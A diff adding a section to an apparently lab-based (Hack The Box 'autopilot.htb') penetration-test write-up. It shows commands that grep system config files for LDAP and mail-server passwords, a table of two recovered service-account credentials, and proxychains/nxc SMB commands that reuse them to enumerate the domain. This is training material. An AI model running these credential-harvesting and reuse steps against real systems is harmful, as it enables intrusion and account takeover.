@@ -649,6 +649,69 @@ SMB       172.16.20.15    AUTOPILOT/stephanie.lewis  TRUE
 ```
 
 
+---
+---
+---
+---
+---
+---
+---
+
+
+```
+# 1. Look for LDAP / AD bind configs (grommunio uses these to sync with AD)
+grep -ri "da-stephanie\|stephanie.lewis\|ldap_bind\|bindpw\|bind_pass" /etc/ 2>/dev/null
+
+
+# 3. Postfix / sasl / dovecot auth files
+cat /etc/postfix/*.cf | grep -i "user\|password"
+cat /etc/dovecot/*.conf 2>/dev/null | grep -i "pass\|user"
+
+# 4. Any deployment notes, scripts, or backups left on disk
+grep -rl "da-stephanie" / 2>/dev/null
+find / -iname "*ldap*" -o -iname "*ad*.conf" 2>/dev/null | head
+```
+
+
+<img width="1468" height="348" alt="image" src="https://github.com/user-attachments/assets/2a395b25-2785-4c92-839b-cd36d76c6539" />
+
+
+### found
+
+
+| Account     | DN                                                                  | Password                      | Source                                |
+| ----------- | ------------------------------------------------------------------- | ----------------------------- | ------------------------------------- |
+| `svc_ldap`  | `CN=svc_ldap,OU=Service_Accounts,OU=Resources,DC=autopilot,DC=htb`  | `Brother6-Let-Ship-Been-Take` | `/etc/gromox/ldap_adaptor.cfg`        |
+| `svc_smime` | `CN=svc_smime,OU=Service_Accounts,OU=Resources,DC=autopilot,DC=htb` | `qzK3xTs02G11KSkhCewW`        | `/etc/grommunio-web/config-smime.php` |
+
+
+---
+
+```
+proxychains4 -q nxc smb 172.16.20.1 -u svc_ldap -p 'Brother6-Let-Ship-Been-Take' -d AUTOPILOT --users --groups --shares
+
+proxychains4 -q nxc smb 172.16.20.1 -u svc_smime -p 'qzK3xTs02G11KSkhCewW' -d AUTOPILOT --users --groups --shares
+```
+
+
+<img width="1559" height="139" alt="image" src="https://github.com/user-attachments/assets/a1cf9228-64b2-4446-b2a0-4f8351a88467" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
